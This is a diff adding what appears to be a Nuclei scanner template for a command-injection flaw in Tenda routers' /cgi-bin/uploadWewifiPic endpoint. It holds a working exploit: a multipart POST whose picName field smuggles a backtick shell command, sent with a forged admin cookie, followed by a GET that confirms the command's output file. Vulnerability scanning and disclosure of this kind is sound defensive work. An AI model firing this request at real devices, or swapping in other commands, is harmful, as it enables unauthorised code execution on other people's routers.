@@ -1,0 +1,55 @@
+id: tenda-uploadwewifipic-rce
+info:
+  name: Tenda Auth uploadWewifiPic RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a command execution vulnerability in the uploadWewifiPic route in the background of Tenda routers. Attackers can use the vulnerability to execute arbitrary commands to obtain server permissions.
+  tags: rce,tenda
+  reference:
+    - https://fofa.so
+  remediation: |
+    The vendor has released a bug fix, please pay attention to the update in time: https://www.tenda.com.cn
+
+variables:
+  rand_name: '{{rand_base(4)}}'
+  cmd_payload: 'wewifipic1`ls>/webroot/{{rand_name}}.txt`'
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/uploadWewifiPic HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEHyn0rb3RDhDg11R
+        Cookie: user=admin
+
+        ------WebKitFormBoundaryEHyn0rb3RDhDg11R
+        Content-Disposition: form-data; name="picName"
+
+        {{cmd_payload}}
+        ------WebKitFormBoundaryEHyn0rb3RDhDg11R
+        Content-Disposition: form-data; name="uploadFile"; filename="{{rand_name}}.png"
+        Content-Type: image/png
+
+        1
+        ------WebKitFormBoundaryEHyn0rb3RDhDg11R--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /{{rand_name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: user=admin
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "webroot"
